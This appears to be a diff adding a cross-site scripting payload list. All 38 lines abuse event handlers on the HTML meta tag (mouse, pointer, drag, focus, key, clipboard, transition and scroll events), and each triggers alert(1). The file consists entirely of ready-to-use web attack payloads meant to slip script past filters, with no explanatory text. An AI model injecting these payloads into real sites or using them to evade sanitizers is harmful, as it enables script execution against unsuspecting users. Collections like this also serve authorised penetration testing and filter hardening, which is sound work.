@@ -1,0 +1,38 @@
+<meta contenteditable onbeforeinput=alert(1)>test
+<meta draggable="true" ondrag="alert(1)" style=display:block>test</meta>
+<meta draggable="true" ondragend="alert(1)" style=display:block>test</meta>
+<meta draggable="true" ondragenter="alert(1)" style=display:block>test</meta>
+<meta draggable="true" ondragleave="alert(1)" style=display:block>test</meta>
+<meta draggable="true" ondragstart="alert(1)" style=display:block>test</meta>
+<meta id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></meta>
+<meta id=x tabindex=1 onfocus=alert(1) style=display:block></meta>
+<meta id=x tabindex=1 onfocusin=alert(1) style=display:block></meta>
+<meta onafterscriptexecute=alert(1)><script>1</script>
+<meta onbeforescriptexecute=alert(1)><script>1</script>
+<meta onblur=alert(1) id=x tabindex=1 style=display:block>test</meta><input value=clickme>
+<meta onclick="alert(1)" style=display:block>test</meta>
+<meta oncontextmenu="alert(1)" style=display:block>test</meta>
+<meta oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<meta oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<meta ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</meta>
+<meta onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</meta><input value=clickme>
+<meta onkeydown="alert(1)" contenteditable style=display:block>test</meta>
+<meta onkeypress="alert(1)" contenteditable style=display:block>test</meta>
+<meta onkeyup="alert(1)" contenteditable style=display:block>test</meta>
+<meta onmousedown="alert(1)" style=display:block>test</meta>
+<meta onmouseenter="alert(1)" style=display:block>test</meta>
+<meta onmouseleave="alert(1)" style=display:block>test</meta>
+<meta onmousemove="alert(1)" style=display:block>test</meta>
+<meta onmouseout="alert(1)" style=display:block>test</meta>
+<meta onmouseover="alert(1)" style=display:block>test</meta>
+<meta onmouseup="alert(1)" style=display:block>test</meta>
+<meta onmousewheel=alert(1) style=display:block>requires scrolling
+<meta onpointerdown=alert(1) style=display:block>XSS</meta>
+<meta onpointerenter=alert(1) style=display:block>XSS</meta>
+<meta onpointerleave=alert(1) style=display:block>XSS</meta>
+<meta onpointermove=alert(1) style=display:block>XSS</meta>
+<meta onpointerout=alert(1) style=display:block>XSS</meta>
+<meta onpointerover=alert(1) style=display:block>XSS</meta>
+<meta onpointerrawupdate=alert(1) style=display:block>XSS</meta>
+<meta onpointerup=alert(1) style=display:block>XSS</meta>
+<meta onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></meta>
